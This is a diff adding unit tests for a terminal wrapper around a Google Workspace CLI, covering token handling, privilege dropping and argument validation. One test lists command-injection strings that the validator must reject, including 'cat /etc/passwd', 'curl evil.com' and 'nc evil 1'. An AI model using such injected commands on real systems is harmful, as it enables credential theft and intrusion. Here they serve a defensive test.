@@ -19,6 +19,8 @@ import {
   shellQuote,
   truncateOutput,
   MAX_OUTPUT_CHARS,
+  buildWorkspaceCommand,
+  validateWorkspaceArgs,
 } from '../src/lib/terminal';
 
 describe('resolveWorkspacePath', () => {
@@ -180,5 +182,61 @@ describe('truncateOutput', () => {
   it('passes short output through untouched', () => {
     expect(truncateOutput('hi')).toEqual({ text: 'hi', truncated: false });
     expect(truncateOutput(undefined)).toEqual({ text: '', truncated: false });
+  });
+});
+
+describe('buildWorkspaceCommand (Google Workspace CLI)', () => {
+  const TOKEN = 'ya29.a0AfB_byExampleToken';
+
+  it('passes the OAuth token via the ENVIRONMENT, never argv', () => {
+    // /proc/<pid>/cmdline is world-readable inside the container; a process's
+    // environment is only readable by its own uid. The token must not be in argv.
+    const cmd = buildWorkspaceCommand('drive files list', TOKEN);
+    expect(cmd).toContain(`GOOGLE_WORKSPACE_CLI_TOKEN=${TOKEN}`);
+    const afterGws = cmd.slice(cmd.indexOf(' gws '));
+    expect(afterGws).not.toContain(TOKEN);
+  });
+
+  it('runs as the unprivileged terminal user from a clean environment', () => {
+    const cmd = buildWorkspaceCommand('gmail messages list', TOKEN);
+    expect(cmd).toContain('gosu hermes-term');
+    expect(cmd).toContain('env -i');
+    expect(cmd).toContain('set +x'); // no shell tracing can echo the token
+  });
+
+  it('rejects a malformed token rather than interpolating it', () => {
+    for (const bad of ['', 'tok en', "tok'en", 'tok\nen', 'tok;en\n']) {
+      expect(() => buildWorkspaceCommand('drive files list', bad)).toThrow(TerminalBoundaryError);
+    }
+  });
+});
+
+describe('validateWorkspaceArgs', () => {
+  it('accepts ordinary gws invocations', () => {
+    expect(validateWorkspaceArgs('drive files list --page-size=10')).toBe('drive files list --page-size=10');
+    expect(validateWorkspaceArgs('gmail messages list --query=from:a@b.com')).toContain('gmail');
+  });
+
+  it('REJECTS shell metacharacters that could chain a second command', () => {
+    // Unlike exec, args are appended after `gws`, so a chained command would
+    // inherit the OAuth token from the environment. Filtering IS correct here:
+    // the surface is a fixed binary, not an arbitrary shell.
+    for (const bad of [
+      'drive files list; cat /etc/passwd',
+      'drive files list && curl evil.com',
+      'drive files list | nc evil 1',
+      'drive files list `id`',
+      'drive files list $(id)',
+      'drive files list > /workspace/out',
+      'drive files list\nid',
+      'drive files list & id',
+    ]) {
+      expect(() => validateWorkspaceArgs(bad)).toThrow(TerminalBoundaryError);
+    }
+  });
+
+  it('rejects empty and oversized args', () => {
+    expect(() => validateWorkspaceArgs('')).toThrow(TerminalBoundaryError);
+    expect(() => validateWorkspaceArgs('a'.repeat(4_001))).toThrow(TerminalBoundaryError);
   });
 });
